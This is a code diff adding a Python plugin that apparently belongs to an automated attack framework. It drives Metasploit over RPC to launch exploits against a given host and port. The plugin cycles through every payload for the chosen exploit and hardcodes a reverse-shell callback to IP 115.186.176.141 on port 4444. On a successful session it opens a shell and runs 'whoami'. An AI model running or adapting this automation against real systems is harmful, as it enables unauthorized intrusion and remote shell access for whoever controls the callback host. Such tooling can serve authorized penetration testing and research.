@@ -1,0 +1,134 @@
+from util import Utility
+import configparser
+import os
+import time
+from __const import FAIL, WARNING, NOTE, OK
+from pymetasploit3.msfrpc import MsfRpcClient
+import sys
+from CannonPlug import CannonPlug
+from enum import Enum
+class ExploitResult(Enum):
+    SUCCESS = 255
+    FAILURE = -1
+class MetasploitCannon(CannonPlug):
+    def __init__(self):
+        super().__init__()
+
+        self.util = Utility()
+        
+        full_path = os.path.dirname(os.path.abspath(__file__))
+        config = configparser.ConfigParser()
+        try:
+            config.read(os.path.join(full_path, 'config.ini'))
+        except FileExistsError as err:
+            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
+            sys.exit(1)
+        
+        self.msfhost = config['MetasploitCannon']['server_host']
+        self.msfport = int(config['MetasploitCannon']['server_port'])
+        self.msfpass = config['MetasploitCannon']['msgrpc_pass']
+        self.msfuser = config['MetasploitCannon']['msgrpc_user']
+
+        self.msfclient = MsfRpcClient(self.msfpass, port=self.msfport, username=self.msfuser, server=self.msfhost)
+        
+        self.exploit = None
+        self.auxiliary = None
+        self.payload = None
+        self.msfshell = 0
+
+        self.supportedModules = {
+            "TA0001": self.msfclient.modules.exploits,
+            "TA0002": self.msfclient.modules.post
+        }
+        
+    def getPlugInfo(self):
+        return {
+            "Name": "Metasploit Cannon",
+            "Description": "Using metasploit to complete Initial Access Stage and Execution Stage."
+        }
+    def getSupportedAttackTactics(self):
+        return self.supportedModules.keys()
+    def getModulesForTactics(self, techID: str):
+        return self.supportedModules[techID]
+    def fireModule(self, module: str, host: str, port: int):
+        self.setTargetExploit(module)
+        for payload in self.exploit.targetpayloads():
+            self.util.print_message(NOTE, "Using Payload: " + payload)
+            self.setTargetPayload(payload)
+            self.setExploitOptions(RHOST=host, RPORT=port)
+            self.setPayloadOptions(LHOST='115.186.176.141', LPORT=4444)
+            result = self.exploitNow()
+            if(result==ExploitResult.SUCCESS):
+                shell = self.getShell()
+                shell.write("whoami")
+                res = shell.read()
+                self.util.print_message(OK, "Executed test command 'whoami' and got output:\n" + res )
+                return shell
+        return None
+        
+    def setTargetExploit(self, exploit):
+        expSplit = MetasploitCannon.__parseMsfModule(exploit)
+        if(expSplit[0] == 'exploit' and expSplit[1] in self.msfclient.modules.exploits):
+            self.exploit = self.msfclient.modules.use('exploit', expSplit[1])
+#            print(self.exploit.payload)
+            self.payload = None
+        else:
+            raise ValueError("Invalid Exploit Module")
+
+    def setTargetPayload(self, payload):
+        # if payload is None:
+        #     self.payload = None
+        if(self.exploit is None):
+            raise RuntimeError("First Select Exploit")
+        elif payload not in self.exploit.targetpayloads():
+            raise ValueError("Invalid payload for selected exploit.")
+        else:
+           self.payload = self.msfclient.modules.use('payload', payload)
+    
+    def setExploitOptions(self, **kwargs):
+        for key, value in kwargs.items():
+            if(key in self.exploit.options):
+                self.exploit[key] = value
+            elif key == 'RHOST':
+                self.exploit['RHOSTS'] = value
+
+    def setPayloadOptions(self, **kwargs):
+        for key, value in kwargs.items():
+            if(key in self.payload.options):
+                self.payload[key] = value
+            
+
+    def exploitNow(self):
+        # if(self.exploit.missing_required):
+        #     raise ValueError("Following Parameters required for exploit are missing: " + str(self.exploit.missing_required))
+        # elif(self.payload is not None and self.payload.missing_required):
+        #     raise ValueError("Following Parameters required for exploit are missing: " + str(self.payload.missing_required))
+        # else:
+        self.exploitResult = self.exploit.execute(payload=self.payload)
+        if(self.exploitResult['job_id']):
+            time.sleep(15)
+            success= False
+            for session_id in self.msfclient.sessions.list:
+                if(self.msfclient.sessions.list[session_id]['exploit_uuid'] == self.exploitResult['uuid']):
+                    self.session = str(session_id)
+                    success = True
+                else:
+                    continue
+            if(success):
+                self.util.print_message(OK, "Session Created Successfully using exploit " + str(self.exploit.modulename) + " and payload" + str(self.payload.modulename))
+                return ExploitResult.SUCCESS
+            else:
+                self.util.print_message(WARNING, "Exploit executed successfully but no session was created")
+                return ExploitResult.FAILURE
+        else:
+            return ExploitResult.FAILURE
+            
+    def getShell(self):
+        return self.msfclient.sessions.session(self.session)
+
+
+            
+    
+    @staticmethod
+    def __parseMsfModule(module):
+        return module.split("/", 1)
